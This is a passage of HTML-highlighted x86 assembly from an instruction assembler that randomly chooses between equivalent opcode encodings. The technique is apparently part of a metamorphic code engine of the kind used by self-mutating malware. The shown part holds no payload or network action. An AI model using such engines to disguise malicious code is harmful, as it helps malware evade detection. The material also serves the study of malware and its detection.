     </span><span class="sc5">@@Assemble_TEST8RegImm</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; Let's code TEST</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Get the register in EAX</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; If Reg == AL, we can use</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Assemble_TEST8RegImm_NotEAX</span><span class="sc0"> </span><span class="sc1">; the specific opcode for</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">               </span><span class="sc1">; AL register: A8h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_TEST8RegImm_NotEAX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A8h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">@@Assemble_OPRegImm_OneByteOpcode</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
     </span><span class="sc5">@@Assemble_TEST8RegImm_NotEAX</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; If it's not AL, then we</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">                </span><span class="sc1">; use the normal opcode: F6</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">; (the same as with TEST Reg,</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">@@Assemble_OPRegImm_Normal_01</span><span class="sc0">   </span><span class="sc1">; Mem but with the</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                   </span><span class="sc1">; register usage activated.</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
     </span><span class="sc5">@@Assemble_MOV8RegImm</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">            </span><span class="sc1">; If MOV, we can use the</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; normal, one-byte opcode</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_MOV8RegImm_OneByteOpcode</span><span class="sc0"> </span><span class="sc1">; or the opcode used</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C6h</span><span class="sc0">                </span><span class="sc1">; for MOV Mem,Imm but with</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">; register usage active.</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">@@Assemble_OPRegImm_Normal_01</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
     </span><span class="sc5">@@Assemble_MOV8RegImm_OneByteOpcode</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B0h</span><span class="sc0">                </span><span class="sc1">; MOV Reg8,Imm</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">@@Assemble_OPRegImm_OneByteOpcode</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
     </span><span class="sc5">@@Assemble_OP8RegImm_Normal</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; If the register is AL, we</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">                   </span><span class="sc1">; can use the AL exclusive</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; opcode</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Assemble_OP8RegImm_Normal_00</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">            </span><span class="sc1">; Do we use it?</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_OP8RegImm_Normal_00</span><span class="sc0"> </span><span class="sc1">; If no, jump</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">; Get the opcode</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                   </span><span class="sc1">; Add 4 to the opcode to make</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">@@Assemble_OPRegImm_OneByteOpcode</span><span class="sc0"> </span><span class="sc1">; it "OP AL,x"</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
     </span><span class="sc5">@@Assemble_OP8RegImm_Normal_00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">            </span><span class="sc1">; The same as with OP Reg,Imm: both</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; 80h and 82h opcodes are valid for</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">          </span><span class="sc1">; these instructions.</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">@@Assemble_OPRegImm_Normal_01</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

     </span><span class="sc5">@@Assemble_OP8RegReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">          </span><span class="sc1">; Jump if it's not MOV/TEST</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Assemble_OP8RegReg_Normal</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_MOV8RegReg</span><span class="sc0">
     </span><span class="sc5">@@Assemble_TEST8RegReg</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; TEST?</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">84h</span><span class="sc0">          </span><span class="sc1">; Then use TEST opcode</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_TEST8RegReg_00</span><span class="sc0">
     </span><span class="sc5">@@Assemble_MOV8RegReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">88h</span><span class="sc0">          </span><span class="sc1">; Use MOV opcode</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_OP8RegReg_Normal</span><span class="sc0">


     </span><span class="sc5">@@Assemble_OP8RegMem</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">          </span><span class="sc1">; As always...</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Assemble_OP8RegMem_Normal</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_MOV8RegMem</span><span class="sc0">
     </span><span class="sc5">@@Assemble_TEST8RegMem</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">84h</span><span class="sc0">          </span><span class="sc1">; TEST opcode</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_OPRegMem_Normal_00</span><span class="sc0">
     </span><span class="sc5">@@Assemble_MOV8RegMem</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">88h</span><span class="sc0">          </span><span class="sc1">; MOV opcode</span><span class="sc0">
     </span><span class="sc5">@@Assemble_OP8RegMem_Normal</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_OPRegMem_Normal_00</span><span class="sc0">


     </span><span class="sc5">@@Assemble_OP8MemReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">          </span><span class="sc1">; Again...</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Assemble_OPRegMem_Normal_00</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; TEST Reg,Mem = TEST Mem,Reg</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Assemble_TEST8RegMem</span><span class="sc0">
     </span><span class="sc5">@@Assemble_MOV8MemReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">88h</span><span class="sc0">          </span><span class="sc1">; MOV opcode</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_OPRegMem_Normal_00</span><span class="sc0">


</span><span class="sc1">;;;-------------------------------------------------</span><span class="sc0">
     </span><span class="sc5">@@Assemble_Next01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">          </span><span class="sc1">; PUSH pseudoopcode?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Assemble_Next02</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">     </span><span class="sc1">; Select if we use the specific</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; register opcode or the memory</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_PUSHReg_2</span><span class="sc0"> </span><span class="sc1">; opcode set up to use registers</span><span class="sc0">
     </span><span class="sc5">@@Assemble_PUSHReg_1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Get the opcode (50h or 58h)</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Bind the register</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
     </span><span class="sc5">@@Assemble_StoreByte</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; Store the one-byte opcode</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
     </span><span class="sc5">@@Assemble_PUSHReg_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">         </span><span class="sc1">; Two bytes opcode for PUSH Reg is</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; FF,(F0 + Reg)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F0h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

     </span><span class="sc5">@@Assemble_Next02</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc0">          </span><span class="sc1">; POP Reg?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Assemble_Next03</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">     </span><span class="sc1">; Select one-byte or two-bytes opc.</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_PUSHReg_1</span><span class="sc0">  </span><span class="sc1">; POP Reg (one byte opcode)</span><span class="sc0">
     </span><span class="sc5">@@Assemble_POPReg_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8Fh</span><span class="sc0">          </span><span class="sc1">; Two bytes POP Reg opcode is</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; 8F,(C0 + Reg)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

     </span><span class="sc5">@@Assemble_Next03</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">51h</span><span class="sc0">          </span><span class="sc1">; PUSH Mem?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Assemble_Next04</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">         </span><span class="sc1">; Opcode is FF,(30+mem codification)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">
     </span><span class="sc5">@@Assemble_POPMem</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; Set opcode (FF or 8F)</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Asm_MakeMemoryAddress</span><span class="sc0"> </span><span class="sc1">; Code the memory reference</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

     </span><span class="sc5">@@Assemble_Next04</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">59h</span><span class="sc0">          </span><span class="sc1">; POP Mem?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Assemble_Next05</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8Fh</span><span class="sc0">          </span><span class="sc1">; Opcode is 8F,(00+mem codification)</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_POPMem</span><span class="sc0">


     </span><span class="sc5">@@Assemble_Next05</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">          </span><span class="sc1">; PUSH Imm?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Assemble_Next06</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; Set opcode 68h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Get the Imm to push</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Assemble_PUSHImm_Byte</span><span class="sc0">  </span><span class="sc1">; Check if we can use the</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF80h</span><span class="sc0">        </span><span class="sc1">; PUSH signed-Imm opcode</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Assemble_PUSHImm_Byte</span><span class="sc0">
     </span><span class="sc5">@@Assemble_PUSHImm_Dword</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; Store the Imm</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">           </span><span class="sc1">; Increase the storage EIP</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
     </span><span class="sc5">@@Assemble_PUSHImm_Byte</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; Select randomly if we use a sign</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">    </span><span class="sc1">; extended byte Imm or a dword Imm</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_PUSHImm_Dword</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6Ah</span><span class="sc0">         </span><span class="sc1">; Insert the opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; Put the value</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

     </span><span class="sc5">@@Assemble_Next06</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E0h</span><span class="sc0">        </span><span class="sc1">; NOT?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Assemble_Next07</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc0">        </span><span class="sc1">; EBX = NOT operation under F7 opcode</span><span class="sc0">
     </span><span class="sc5">@@Assemble_NEG32Reg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F7h</span><span class="sc0">        </span><span class="sc1">; F7 = opcode of NOT/NEG and etc.</span><span class="sc0">
     </span><span class="sc5">@@Assemble_Nxx8Reg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; Set the first opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">; Bind the register to the 2nd opcd.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; Store it</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

     </span><span class="sc5">@@Assemble_Next07</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E4h</span><span class="sc0">        </span><span class="sc1">; NEG Reg?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Assemble_Next08</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D8h</span><span class="sc0">        </span><span class="sc1">; Set NEG Reg operation on 2nd opc.</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_NEG32Reg</span><span class="sc0">

